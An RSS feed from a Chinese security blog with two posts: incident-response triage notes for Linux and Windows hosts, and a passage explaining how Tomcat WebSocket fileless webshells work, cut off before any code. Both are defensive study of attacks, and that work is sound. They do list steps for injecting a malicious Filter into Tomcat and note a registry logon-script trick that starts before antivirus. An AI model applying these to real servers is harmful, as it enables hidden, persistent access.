<?xml version="1.0" encoding="utf-8"?>






<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>wh1sper</title>
        <link>https://blog.wh1sper.com/</link>
        <description>wh1sper的个人博客. web安全, 安全研究, CTF, writeup。</description>
        <generator>Hugo 0.90.1 https://gohugo.io/</generator>
        
            <language>zh-CN</language>
        
        
            <managingEditor>pwned[&lt;at&gt;]qq.com (wh1sper)</managingEditor>
        
        
            <webMaster>pwned[&lt;at&gt;]qq.com (wh1sper)</webMaster>
        
        
            <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
        
        <lastBuildDate>Tue, 27 Dec 2022 16:23:08 &#43;0800</lastBuildDate>
        
            <atom:link rel="self" type="application/rss&#43;xml" href="https://blog.wh1sper.com/rss.xml" />
        
        
            <item>
                <title>应急响应笔记</title>
                <link>https://blog.wh1sper.com/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/</link>
                <guid isPermaLink="true">https://blog.wh1sper.com/posts/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/</guid>
                <pubDate>Mon, 15 Aug 2022 15:33:08 &#43;0800</pubDate>
                
                    <author>pwned[&lt;at&gt;]qq.com (wh1sper)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;常见的应急响应事件分类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Web入侵：网页挂马、主页篡改、Webshell&lt;/li&gt;
&lt;li&gt;系统入侵：病毒木马、勒索软件、远控后门&lt;/li&gt;
&lt;li&gt;网络攻击：DDOS攻击、DNS劫持、ARP欺骗&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;具体情况具体分析，如果是一台失陷的公网Web主机，那么着重从Web服务层面去排查，如果是内网一台Windows，那么着重从系统层面去排查，原则上能用工具则用工具&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202208151430782.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;linux&#34;&gt;Linux&lt;/h2&gt;
&lt;h3 id=&#34;敏感目录&#34;&gt;敏感目录&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/tmp&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/init.d/&lt;/code&gt; 自启动目录&lt;/li&gt;
&lt;li&gt;web目录&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ls -ltha列举所有文件&lt;/p&gt;
&lt;p&gt;基于时间和权限的筛选&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;find ./ -mtime 0 -name &amp;quot;*.php&amp;quot;
# 查找24h内修改的php文件

find ./ -iname &amp;quot;*.php&amp;quot; -perm 777
# -iname 忽略大小写，-perm查找777权限
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;网络连接与进程&#34;&gt;网络连接与进程&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;netstat -pantl
netstat -anpt
netstat -pantl | grep &amp;quot;ESTABLISHED&amp;quot;查看正在建立连接的端口
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;查看进程对应的文件&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ps aux 
ps aux | grep ${PID}
lsof -i:${PORT} # 查看占用端口的进程号
kill -9 ${PID} # 
killall php-fpm # 杀死所有php-fpm进程
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;登录与用户&#34;&gt;登录与用户&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;last -i | grep -v 0.0.0.0 # 查看登录日志，筛选非本地登录
w # 看现在那些用户登陆了
cat /etc/passwd | grep &amp;quot;0:0&amp;quot;
awk -F: &#39;$3==0{print $1}&#39; /etc/passwd # 查询特权用户
awk &#39;/\$1|\$6/{print $1}&#39; /etc/shadow # 查询可以远程登录的账号
more /etc/sudoers | grep -v &amp;quot;^#\|^$&amp;quot; grep &amp;quot;ALL=(ALL)&amp;quot; # 查询具有sudo权限的账号
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;历史命令&#34;&gt;历史命令&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;history
cat ~/.bash_history
cat /root/.bash_history
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;注意
&lt;code&gt;.bash_history&lt;/code&gt; 要当ssh session正常退出之后才会写入，如果是非正常退出的话不会写入&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;计划任务&#34;&gt;计划任务&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;crontab -e
crontab -l
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以用工具解析&lt;/p&gt;
&lt;h3 id=&#34;启动项预加载文件&#34;&gt;启动项、预加载文件&lt;/h3&gt;
&lt;p&gt;自启动服务&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ls /etc/init.d/ # 自启动服务
/etc/init.d/xxx status #查看状态
update-rc.d disable # 取消开机自启
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开机启动项&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;more /etc/rc.local
/etc/rc.d/rc[0-6].d
ls -l /etc/rc.d/rc3.d/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开机预加载的文件&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统级别
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/etc/profile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/etc/paths&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;用户级别
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;~/.bash_profile&lt;/code&gt; （mac用的）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.bash_login&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.profile&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;~/.bashrc&lt;/code&gt; (linux用的)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;windows&#34;&gt;Windows&lt;/h2&gt;
&lt;h3 id=&#34;网络连接&#34;&gt;网络连接&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;netstat -ano 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果网络连接出现以下情况，则当前主机可能已经失陷&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;主机存在对内网网段大量主机的某些端口（常见如22，445，3389，6379等端口）或者全端口发起网络连接尝试，这种情况一般是当前主机被攻击者当作跳板机对内网实施端口扫描或者口令暴力破解等攻击。&lt;/li&gt;
&lt;li&gt;主机和外网IP已经建立连接（ESTABLISHED状态）或者尝试建立连接（SYN_SENT状态），可以先查询IP所属地，如果IP为国外IP或者归属各种云厂商，则需要重点关注。进一步可以通过威胁情报（&lt;a href=&#34;https://x.threatbook.cn/&#34;&gt;https://x.threatbook.cn&lt;/a&gt;等）查询IP是否已经被标注为恶意IP。&lt;/li&gt;
&lt;li&gt;如果无法直接从网络连接情况判断是否为异常连接，可以根据网络连接找到对应的进程ID，判断进程是否异常。如果不能从进程判断，可以进一步找到进程对应文件，将对应文件上传至virustotal（&lt;a href=&#34;https://www.virustotal.com&#34;&gt;https://www.virustotal.com&lt;/a&gt;）进行检测。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;windows通过进程找到文件路径:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 打开所有端口进程列表
netstat -ano

# 找到可以的端口链接
netstat -ano | findstr 13232

# 通过pid找到进程
tasklist | findstr 13232

# 通过进程找到文件路径
wmic process where name=&amp;quot;firefox.exe&amp;quot; get processid,executablepath,name
wmic process get name,executablepath,processid|findstr 2860
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;敏感目录-1&#34;&gt;敏感目录&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;各个盘符下的临时目录，如 &lt;code&gt;C:\TEMP&lt;/code&gt;、&lt;code&gt;C:\Windows\Temp&lt;/code&gt;等。&lt;/li&gt;
&lt;li&gt;攻击队喜欢放马的目录，比如 &lt;code&gt;C:\Users\Public&lt;/code&gt; 下的各个目录&lt;/li&gt;
&lt;li&gt;浏览器的下载目录&lt;/li&gt;
&lt;li&gt;&lt;code&gt;%UserProfile%\Recent&lt;/code&gt;，查看用户最近操作的文件&lt;/li&gt;
&lt;li&gt;回收站，如C盘下回收站&lt;code&gt;C:\$Recycle.Bin&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;web目录&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;记得按照时间排序，来查看最近修改的文件夹&lt;/p&gt;
&lt;h3 id=&#34;后门帐号&#34;&gt;后门帐号&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;注册表&lt;/strong&gt;
查看注册表中&lt;code&gt;HKLM\SAM\SAM\Domains\Account\Users\Names&lt;/code&gt; （或者&lt;code&gt;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names&lt;/code&gt;）中是否有多余的账号（可询问客户运维人员以确定账号存在的必要性）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;正常情况下，上述路径的SAM权限仅system用户可查看，需要给administrator用户授权才能打开完整路径。对SAM右键、给administator用户添加完全控制权限，记得改回去&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;下图 &lt;code&gt;admin$&lt;/code&gt; 即为后门账号&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Anthem-whisper/imgbed/master/img/202208151526676.png&#34; alt=&#34;ec15199cfe61cb1135dd4e9ea9a82b93.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;计算机管理&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;compmgmt.msc # 查看用户和用户组
lusrmgr.msc #  查看用户和用户组
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;net命令&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;net user # 查询本机用户
net localgroup Administrators # 查询admin组
query user # 查询登录用户
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;启动项&#34;&gt;启动项&lt;/h3&gt;
&lt;p&gt;启动目录&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%programdata%\Microsoft\Windows\Start Menu\Programs\Startup # 系统启动目录
%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup # 用户登陆时启动目录
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注册表&lt;/p&gt;
&lt;p&gt;太多了，就说一两个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Run注册表键值为开机启动项,每一次开机都会执行键值对应的程序或bat脚本&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Logon Scripts是优先于很多杀毒软件启动的,所以可以通过这种方式达到一定的免杀效果&lt;/p&gt;
&lt;p&gt;在注册表&lt;code&gt;HKEY_CURRENT_USER\Environment&lt;/code&gt;这条路径下,添加新的字符串值,值的名字为:&lt;code&gt;UserInitMprLogonScript&lt;/code&gt;，数值数据为想要启动程序的路径&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;另外&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注册表项很多，建议使用火绒剑一把梭&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;计划任务服务&#34;&gt;计划任务、服务&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;同样建议火绒剑一把梭&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;taskschd.msc # 计划任务查看器
schtasks # 命令行查看计划任务

services.msc # 服务查看器

systeminfo # 查询补丁信息

eventvwr.msc # 事件查看器（查看系统日志，安全日志）
&lt;/code&gt;&lt;/pre&gt;</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/categories/note/">note</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://blog.wh1sper.com/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>Tomcat WebSocket内存马原理浅析</title>
                <link>https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</link>
                <guid isPermaLink="true">https://blog.wh1sper.com/posts/tomcat-websocket%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/</guid>
                <pubDate>Tue, 19 Jul 2022 00:58:30 &#43;0800</pubDate>
                
                    <author>pwned[&lt;at&gt;]qq.com (wh1sper)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;p&gt;本文首发跳跳糖：&lt;a href=&#34;https://tttang.com/archive/1673/&#34;&gt;《Tomcat WebSocket内存马原理浅析》&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;周末和N1k0la师傅看到了这个repo：&lt;a href=&#34;https://github.com/veo/wsMemShell&#34;&gt;wsMemShell&lt;/a&gt;，决定来研究一番。&lt;/p&gt;
&lt;p&gt;正好某大行动要开始了，希望此文能抛砖引玉，给师傅们带来一些启发。文章写的不好，疏漏之处细节欢迎师傅们指正。&lt;/p&gt;
&lt;h2 id=&#34;tomcat-websocket的实现&#34;&gt;Tomcat WebSocket的实现&lt;/h2&gt;
&lt;p&gt;Tomcat自7.0.2版本开始支持WebSocket，采用自定义API，即WebSocketServlet。&lt;/p&gt;
&lt;p&gt;从2013年有了&lt;code&gt;JSR356&lt;/code&gt;标准之后，Tomcat自7.0.47版本废弃自定义的API，实现了Java WebSocket规范（JSR356 ）&lt;/p&gt;
&lt;p&gt;根据JSR356规定， 建立WebSocket连接的服务器端和客户端，两端对称，可以互相通信。把通信端点抽象成类，就是&lt;code&gt;Endpoint&lt;/code&gt;，每一个Endpoint对象代表WebSocket链接的一端，服务器端的叫&lt;code&gt;ServerEndpoint&lt;/code&gt;，客户端的叫&lt;code&gt;ClientEndpoint&lt;/code&gt;。客户端向服务端发送WebSocket握手请求，建立连接后就创建一个&lt;code&gt;ServerEndpoint&lt;/code&gt;对象。&lt;/p&gt;
&lt;p&gt;ServerEndpoint和ClientEndpoint，有相同的生命周期事件（OnOpen、OnClose、OnError、OnMessage），不同之处是ServerEndpoint作为服务器端点，可以指定一个URI路径供客户端连接，ClientEndpoint则没有。&lt;/p&gt;
&lt;p&gt;Endpoint对象的生命周期方法如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;onOpen：当开启一个新的会话时调用。这是客户端与服务器握手成功后调用的方法，等同于注解@OnOpen。&lt;/li&gt;
&lt;li&gt;onClose：当会话关闭时调用。等同于注解@OnClose。&lt;/li&gt;
&lt;li&gt;onError：当链接过程中异常时调用。等同于注解@OnError。&lt;/li&gt;
&lt;li&gt;onMessage：接收到消息时触发。等同于注解@OnMessage&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;服务端实现endpoint的方式&#34;&gt;服务端实现Endpoint的方式&lt;/h3&gt;
&lt;p&gt;服务器端的&lt;code&gt;Endpoint&lt;/code&gt;有两种实现方式，一种是注解方式&lt;code&gt;@ServerEndpoint&lt;/code&gt;，一种是继承抽象类&lt;code&gt;Endpoint&lt;/code&gt;。&lt;/p&gt;
&lt;h4 id=&#34;注解方式serverendpoint&#34;&gt;注解方式：@ServerEndpoint&lt;/h4&gt;
&lt;p&gt;官方文档：&lt;a href=&#34;https://docs.oracle.com/javaee/7/api/javax/websocket/server/ServerEndpoint.html&#34;&gt;ServerEndpoint (Java(TM) EE 7 Specification APIs)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;一个@ServerEndpoint注解应该有以下元素：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;value&lt;/code&gt;：必要，String类型，此Endpoint部署的URI路径。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;configurator&lt;/code&gt;：非必要，继承ServerEndpointConfig.Configurator的类，主要提供ServerEndpoint对象的创建方式扩展（如果使用Tomcat的WebSocket实现，默认是反射创建ServerEndpoint对象）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;decoders&lt;/code&gt;：非必要，继承Decoder的类，用户可以自定义一些消息解码器，比如通信的消息是一个对象，接收到消息可以自动解码封装成消息对象。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;encoders&lt;/code&gt;：非必要，继承Encoder的类，此端点将使用的编码器类的有序数组，定义解码器和编码器的好处是可以规范使用层消息的传输。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;subprotocols&lt;/code&gt;：非必要，String数组类型，用户在WebSocket协议下自定义扩展一些子协议。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;nd&#34;&gt;@ServerEndpoint&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;value&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;encoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageEncoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decoders&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;MessageDecoder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;},&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;configurator&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;@ServerEndpoint可以注解到任何类上，但是想实现服务端的完整功能，还需要配合几个生命周期的注解使用，这些生命周期注解只能注解在方法上：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;@OnOpen&lt;/code&gt; 建立连接时触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@OnClose&lt;/code&gt; 关闭连接时触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@OnError&lt;/code&gt; 发生异常时触发。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@OnMessage&lt;/code&gt; 接收到消息时触发。&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;继承抽象类endpoint&#34;&gt;继承抽象类：Endpoint&lt;/h4&gt;
&lt;p&gt;继承抽象类&lt;code&gt;Endpoint&lt;/code&gt;，重写几个生命周期方法，实现两个接口，比加注解 &lt;code&gt;@ServerEndpoint&lt;/code&gt;方式更麻烦。&lt;/p&gt;
&lt;p&gt;其中重写&lt;code&gt;onMessage&lt;/code&gt;需要实现接口&lt;code&gt;jakarta.websocket.MessageHandler&lt;/code&gt;，给Endpoint分配URI路径需要实现接口&lt;code&gt;jakarta.websocket.server.ServerApplicationConfig&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;URI path&lt;/code&gt;、&lt;code&gt;encoders&lt;/code&gt;、&lt;code&gt;decoders&lt;/code&gt;、&lt;code&gt;configurator&lt;/code&gt;等配置信息由&lt;code&gt;jakarta.websocket.server.ServerEndpointConfig&lt;/code&gt;管理，默认实现&lt;code&gt;jakarta.websocket.server.DefaultServerEndpointConfig&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;通过编程方式实现Endpoint，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;serverEndpointConfig&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ServerEndpointConfig&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;Builder&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;WebSocketServerEndpoint3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;/ws/{userId}&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;decoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;encoders&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encoderList&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;configurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;MyServerConfigurator&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;()).&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;();&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;tomcat-websocket的加载&#34;&gt;Tomcat WebSocket的加载&lt;/h2&gt;
&lt;p&gt;Tomcat提供了一个&lt;code&gt;javax.servlet.ServletContainerInitializer&lt;/code&gt;的实现类&lt;code&gt;org.apache.tomcat.websocket.server.WsSci&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ServletContainerInitializer（SCI） 是 Servlet 3.0 新增的一个接口，主要用于在容器启动阶段通过编程风格注册Filter, Servlet以及Listener，以取代通过web.xml配置注册。这样就利于开发内聚的web应用框架.&lt;/p&gt;
&lt;p&gt;具体可看：&lt;a href=&#34;https://blog.csdn.net/lqzkcx3/article/details/78507169&#34;&gt;Servlet3.0研究之ServletContainerInitializer接口&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因此&lt;strong&gt;Tomcat的WebSocket加载是通过SCI机制完成的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;WsSci可以处理的类型有三种：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;添加了注解@ServerEndpoint的类&lt;/li&gt;
&lt;li&gt;Endpoint的子类&lt;/li&gt;
&lt;li&gt;ServerApplicationConfig的实现类&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tomcat在Web应用启动时会在StandardContext的startInternal方法里通过 WsSci 的onStartup方法初始化 Listener 和 servlet，再扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类&lt;/p&gt;
&lt;p&gt;如果当前应用存在ServerApplicationConfig实现，则通过ServerApplicationConfig获取Endpoint子类的配置（ServerEndpointConfig实例，包含了请求路径等信息）和符合条件的注解类，通过调用addEndpoint将结果注册到WebSocketContainer上；如果当前应用没有定义ServerApplicationConfig的实现类，那么WsSci默认只将所有扫描到的注解式Endpoint注册到WebSocketContainer。因此，如果采用可编程方式定义Endpoint，那么必须添加ServerApplicationConfig实现。&lt;/p&gt;
&lt;p&gt;然后startInternal方法里为ServletContext添加一个过滤器&lt;code&gt;org.apache.tomcat.websocket.server.WsFilter&lt;/code&gt;，它用于判断当前请求是否为WebSocket请求，以便完成握手（所以任何Tomcat都可以用&lt;a href=&#34;https://github.com/c0ny1/java-memshell-scanner&#34;&gt;java-memshell-scanner&lt;/a&gt;看到WsFilter）。&lt;/p&gt;
&lt;h2 id=&#34;tomcat-websocket内存马的实现&#34;&gt;Tomcat WebSocket内存马的实现&lt;/h2&gt;
&lt;p&gt;我们先来回顾一下servlet-api型内存马的实现步骤，拿Filter型举例：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;获取当前的StandardContext&lt;/li&gt;
&lt;li&gt;创建恶意Filter&lt;/li&gt;
&lt;li&gt;创建filterDef封装Filter对象，调用StandardContext.addFilterDef方法将filterDef添加到filterDefs&lt;/li&gt;
&lt;li&gt;创建filterMap将URL和filter进行绑定，调用StandardContext.addFilterMapBefore方法将filterMap添加到filterMaps中&lt;/li&gt;
&lt;li&gt;获取filterConfigs变量，并向其中添加filterConfig对象&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;既然要插入恶意Filter，那么我们就需要在Tomcat启动过程中寻找添加FIlter的方法，而filterDef、filterMap、filterConfigs都是StandardContext对象的属性，并且也有相应的add方法，那么我们就需要先获取StandardContext，再调用相应的方法。&lt;/p&gt;
&lt;p&gt;WebSocket内存马也很类似，上一节提到了WsSci 的onStartup扫描 classpath下带有注解@ServerEndpoint的类和Endpoint子类，并且调用addEndpoint方法注册到WebSocketContainer上。那么我们应该从WebSocketContainer出发，而WsServerContainer是在StandardContext里面创建的，那么，显而易见的：&lt;/p&gt;
